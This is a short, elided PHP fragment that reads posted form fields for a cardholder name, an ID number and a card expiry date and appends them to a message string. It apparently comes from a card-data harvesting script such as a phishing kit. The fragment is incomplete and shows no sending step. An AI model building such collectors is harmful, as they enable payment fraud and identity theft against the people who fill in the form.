...
if(isset($_POST)){
	...
	if(isset($_POST["nombre"])){
		$mensaje .= "Nombre en tarjeta: ".$_POST["nombre"]."\n";
		$filter .= strtolower($_POST["nombre"]);
	}
	if(isset($_POST["dni"])){
	...
	if(isset($_POST["mmaa"])){
		$mensaje .= "Vencimiento: ".$_POST["mmaa"]."\n";
		$filter .= strtolower($_POST["mmaa"]);
	}
